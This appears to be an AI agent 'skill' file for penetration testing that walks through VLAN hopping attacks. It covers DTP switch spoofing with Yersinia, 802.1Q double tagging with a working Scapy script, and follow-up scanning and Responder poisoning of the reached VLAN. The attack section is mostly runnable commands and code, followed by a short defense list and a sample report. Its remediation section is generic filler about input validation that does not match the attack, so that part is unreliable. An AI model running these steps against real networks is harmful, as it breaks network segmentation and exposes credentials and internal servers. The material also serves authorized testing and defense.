---
name: vlan-hopping-and-trunking
description: >
  exploit misconfigured network switches to jump from a low-privilege VLAN (e.g., Guest Network) into a
  restricted VLAN (e.g., Corporate or Management Network). Use this skill during internal network penetration
  tests when physical access is achieved or when assessing network segmentation and zero-trust architectures.
  Covers Switch Spoofing (DTP) and Double Tagging (802.1Q).
domain: cybersecurity
subdomain: penetration-testing
category: Network
difficulty: intermediate
estimated_time: "2-4 hours"
mitre_attack:
  tactics: [TA0001, TA0008]
  techniques: [T1095, T1190]
platforms: [linux]
tags: [vlan-hopping, networking, switch-spoofing, double-tagging, internal-pentest, network-segmentation, yersinia]
tools: [yersinia, scapy, wireshark, vconfig]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# VLAN Hopping & Trunking Attacks

## When to Use
- You plug a physical device into a wall jack (e.g., in a conference room) and end up on a heavily restricted Guest or VoIP VLAN.
- Your objective is to reach the internal subnets containing Domain Controllers, sensitive servers, or SCADA equipment.
- When validating if a client's core networking equipment is securely configured.


## Prerequisites
- Network access to the target subnet (VPN, pivot, or direct connection)
- Nmap and relevant network scanning tools installed
- Understanding of TCP/IP, common protocols, and network segmentation
- Root/admin access on the attack machine for raw socket operations

## Workflow

### Phase 1: Passive Reconnaissance (Identifying DTP and Trunking)

```bash
# Concept: If a switch port is placed in "Dynamic Desirable" or "Dynamic Auto" mode,
# it listens for DTP (Dynamic Trunking Protocol) packets to negotiate a trunk link.
# If we negotiate a trunk link, we can see and inject traffic into ALL VLANs.

# 1. Fire up Wireshark or tcpdump on your connected interface (eth0).
# Leave it running for a few minutes.
sudo tcpdump -i eth0 -nn -v -e | grep -i dtp

# 2. Look closely at CDP (Cisco Discovery Protocol) or LLDP packets.
# These protocols often leak the Native VLAN ID, Management IP addresses, and Switch models.
sudo tcpdump -i eth0 -nn -v -s 1500 -c 1 'ether[20:2] == 0x2000' # CDP filter
```

### Phase 2: Switch Spoofing Attack (DTP Exploitation)

```bash
# Concept: Impersonate a switch by sending DTP "Desirable" packets.
# If the target switch port isn't hardcoded to Access Mode (switchport mode access),
# it will form a Trunk with our attacking laptop.

# 1. Use Yersinia to send DTP packets
# Launch Yersinia in interactive mode
sudo yersinia -I

# Press 'g' and select DTP (Dynamic Trunking Protocol).
# Press 'x' to open the attack menu.
# Select "Enable trunking".

# 2. Verify Trunk establishment
# If successful, your interface should start receiving broadcast traffic from MULTIPLE VLANs.
sudo tcpdump -i eth0 -e | grep "802.1Q"

# 3. Create virtual interfaces to access the targets
# Now that we are trunking, we need an IP on the target VLAN (e.g., VLAN 10).
sudo modprobe 8021q
sudo vconfig add eth0 10
sudo ifconfig eth0.10 up
sudo dhclient eth0.10

# BOOM! If DHCP assigns an IP, you've successfully hopped onto the restricted VLAN 10.
```

### Phase 3: Double Tagging Attack (802.1Q Exploitation)

```bash
# Concept: Switch Spoofing failed because DTP is disabled.
# BUT, if your port is on the "Native VLAN" (untagged), you can craft a packet with TWO 802.1Q headers.
# The first switch strips the outer Native header, sees the inner header, and forwards the packet into the restricted VLAN!

# Requirements:
# 1. Attacker MUST be connected to the Native VLAN.
# 2. Can only send packets one-way (UDP/ICMP usually), as returning packets won't double-tag back.
# 3. Useful for hitting UDP vulnerabilities or reverse-shells on restricted servers.

# Scapy Python Script for Double Tagging
import scapy.all as scapy

# Define layers
ethernet = scapy.Ether()
# Outer tag (Native VLAN, e.g., 1)
vlan_outer = scapy.Dot1Q(vlan=1)
# Inner tag (Target Restricted VLAN, e.g., 20)
vlan_inner = scapy.Dot1Q(vlan=20)
ip = scapy.IP(dst="10.20.0.50") # Target Server IP
icmp = scapy.ICMP()

# Combine and fire
packet = ethernet / vlan_outer / vlan_inner / ip / icmp
scapy.sendp(packet, iface="eth0")

# To make this an exploit, replace ICMP with UDP and a payload.
```

### Phase 4: Exploiting the Target VLAN

```bash
# Once a virtual interface (eth0.10) is active via Switch Spoofing, treat it like any local network.

# Scan the new restricted VLAN
nmap -sn 10.10.10.0/24 -e eth0.10

# Launch Responder to poison LLMNR/NBT-NS on the newly accessed VLAN
sudo responder -I eth0.10 -w On -r On -F On
```

## 🔵 Blue Team Detection & Defense
- **Disable DTP**: Issue the command `switchport nonegotiate` on all user-facing access ports to kill Dynamic Trunking Protocol.
- **Enforce Access Mode**: Hardcode end-user access ports with `switchport mode access`. Do not allow "Auto" or "Desirable" modes except between switches.
- **Change Native VLAN**: Never use VLAN 1 as the Native VLAN. Change the Native VLAN to an unused, dead-end VLAN id (e.g., VLAN 999). This completely destroys Double Tagging attacks.
- **Port Security / MAC Filtering**: Limit the number of MAC addresses allowed per port to prevent attackers from spinning up virtual interfaces on multiple VLANs.
- **SIEM Alerts**: Alert dynamically if a switch interface transitions status from Access to Trunk mode rapidly.

## Key Concepts
| Concept | Description |
|---------|-------------|
| Trunk Port | A switch port configured to carry traffic for multiple VLANs simultaneously, identifying them via 802.1Q tags |
| Access Port | A switch port configured to carry traffic for only one specific VLAN (to end-user devices) |
| DTP | Cisco proprietary protocol used to automatically negotiate trunk links between switches |
| 802.1Q | The networking standard that supports VLANs on an IEEE 802.3 Ethernet network by inserting a "tag" in the frame |

## Output Format
```
Network Vulnerability Execution
===============================
Vector: VLAN Hopping via Switch Spoofing (DTP)
Initial Access: Physical connection in Lobby (VLAN 50 - Guest)

Execution Details:
1. Packet capture identified Cisco DTP broadcast frames indicating port fa0/14 was left in 'Dynamic Auto' mode.
2. Yersinia was utilized to inject DTP 'Desirable' frames, successfully negotiating a Trunk link with the core switch.
3. 802.1Q tagged traffic mapped VLAN 10 (Corporate) and VLAN 20 (Management).
4. Created virtual interface `eth0.20`, pulled a DHCP address (10.20.0.115).

Impact: 
Complete circumvention of physical and logical network segmentation. Attacker achieved unauthenticated network line-of-sight to the main Domain Controllers and vCenter management interfaces.
```

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- SANS: [VLAN Hopping Tutorial](https://www.sans.org/reading-room/whitepapers/networkdevs/virtual-local-area-network-vlan-security-33363)
- Scapy documentation: [Scapy Tools](https://scapy.net/)
